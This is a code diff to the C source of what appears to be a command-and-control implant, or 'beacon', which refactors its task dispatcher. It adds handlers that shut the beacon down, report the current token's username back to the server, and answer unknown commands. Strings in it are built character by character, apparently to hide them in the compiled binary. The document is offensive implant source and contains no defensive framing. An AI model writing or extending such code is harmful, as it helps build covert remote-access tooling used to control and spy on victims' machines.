@@ -19,59 +19,114 @@
  * Server.
  *
 -*/
-DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_HDR Req )
+DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_BUF Req )
 {
 	PBEACON_TASK_RES_HDR Res = NULL;
-	PVOID                Ptr = NULL;
+	PBEACON_TASK_RES_HDR Ptr = NULL;
 	ULONG                Cbs = 0;
-	UCHAR                Err[MAX_PATH];
 
 	if ((Ptr = BufferCreate( Ins, sizeof( BEACON_TASK_RES_HDR ) )))
 	{
 		switch ( Req->CallId )
 		{
 			case BEACON_TASK_EXIT_REQUEST:
-				Ins->IsOnline = FALSE;
-				Cbs = BEACON_TASK_EXIT_CALLBACK;
+				Cbs = BeaconTaskExit( Ins, Req->Buffer, &Ptr );
+				break;
+			case BEACON_TASK_USER_REQUEST:
+				Cbs = BeaconTaskUser( Ins, Req->Buffer, &Ptr );
 				break;
 			default:
-				Err[0]  = 'U';
-				Err[1]  = 'n';
-				Err[2]  = 's';
-				Err[3]  = 'u';
-				Err[4]  = 'p';
-				Err[5]  = 'p';
-				Err[6]  = 'o';
-				Err[7]  = 'r';
-				Err[8]  = 't';
-				Err[9]  = 'e';
-				Err[10] = 'd';
-				Err[11] = ' ';
-				Err[12] = 'c';
-				Err[13] = 'o';
-				Err[14] = 'm';
-				Err[15] = 'm';
-				Err[16] = 'a';
-				Err[17] = 'n';
-				Err[18] = 'd';
-				Err[19] = 0x0;
-				Ptr = BufferAddUI4( Ins, Ptr, 0 );
-				Ptr = BufferAddUI4( Ins, Ptr, 0 );
-				Ptr = BufferAddUI4( Ins, Ptr, 0 );
-				Ptr = BufferAddRaw( Ins, Ptr, Err, strlen(Err) );
+				Cbs = BeaconTaskNone( Ins, Req->Buffer, &Ptr );
 				break;
 		};
 
-		if (( Res = Ins->api.LocalLock( Ptr )))
+		if ( Cbs != -1 )
 		{
-			Res->Counter = Ins->LastTask++;
-			Res->Length  = Ins->api.LocalSize( Ptr ) - 8;
-			Res->CallId  = Cbs;
-			Ins->api.LocalUnlock( Ptr );
-
-			return Ptr;
+			if (( Res = Ins->api.LocalLock( Ptr )))
+			{
+				Res->Counter = Ins->ctx.LastTask++;
+				Res->Length  = Ins->api.LocalSize( Ptr ) - 8;
+				Res->CallId  = Cbs;
+				Ins->api.LocalUnlock( Ptr );
+			};
 		};
-		Ins->api.LocalFree( Res );
+
+		Ptr = Cbs != -1 ? Ptr : Ins->api.LocalFree( Ptr );
 	};
-	return NULL;
+	return Ptr;
+};
+
+/*-
+ *
+ * BeaconTaskExit 
+ *
+ * Purpose:
+ *
+ * Exits beacon.
+ *
+-*/
+DEFINESEC(B) ULONG BeaconTaskExit( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
+{
+	Ins->IsOnline = FALSE; 
+
+	return BEACON_TASK_EXIT_CALLBACK;
+};
+
+/*-
+ *
+ * BeaconTaskNone
+ *
+ * Purpose:
+ *
+ * Returns an error string for 
+ * unknown commands.
+ *
+-*/
+DEFINESEC(B) ULONG BeaconTaskNone( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
+{
+	UCHAR Err[ MAX_PATH ];
+
+	Err[0]  = 'U';
+	Err[1]  = 'n';
+	Err[2]  = 'k';
+	Err[3]  = 'n';
+	Err[4]  = 'o';
+	Err[5]  = 'w';
+	Err[6]  = 'n';
+	Err[7]  = ' ';
+	Err[8]  = 'c';
+	Err[9]  = 'o';
+	Err[10] = 'm';
+	Err[11] = 'm';
+	Err[12] = 'a';
+	Err[13] = 'n';
+	Err[14] = 'd';
+	Err[15] = 0x0;
+	*Hdr = BufferAddRaw( Ins, *Hdr, Err, strlen( Err ) );
+
+	return BEACON_TASK_STRING_CALLBACK;
+};
+
+/*
+ *
+ * BeaconTaskUser
+ *
+ * Purpose:
+ *
+ * Returns the username of the current
+ * token.
+ *
+-*/
+DEFINESEC(B) ULONG BeaconTaskUser( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
+{
+	ULONG Call = -1;
+	PVOID User = NULL;
+
+	if ((User = BeaconUsername( Ins )))
+	{
+		*Hdr = BufferAddRaw( Ins, *Hdr, User, strlen( User ) );
+		Call = BEACON_TASK_USER_CALLBACK; 
+		Ins->api.LocalFree( User );
+	};
+	return Call;
 };
